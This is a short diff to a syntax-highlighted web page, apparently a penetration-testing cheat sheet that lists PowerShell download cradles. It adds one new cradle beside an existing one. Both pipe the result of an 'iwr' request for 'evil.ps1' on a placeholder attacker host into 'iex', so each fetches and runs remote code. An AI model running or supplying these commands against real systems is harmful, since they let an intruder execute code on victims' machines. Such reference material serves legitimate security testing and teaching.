@@ -178,6 +178,7 @@
 
 <span class="c"># From PowerShell v3 and onwards</span>
 <span class="nb">iex </span><span class="p">(</span><span class="nb">iwr </span><span class="s1">'http://&lt;remote&gt;/evil.ps1'</span><span class="p">)</span>
+<span class="nb">iex </span><span class="p">(</span><span class="nb">iwr </span><span class="n">-UseBasicParsing</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">attacker</span> <span class="n">ip</span><span class="p">&gt;/</span><span class="n">evil</span><span class="p">.</span><span class="n">ps1</span><span class="p">)</span>
 
 <span class="c"># Using VBScript's Msxml2</span>
 <span class="nv">$h</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">-ComObject</span>
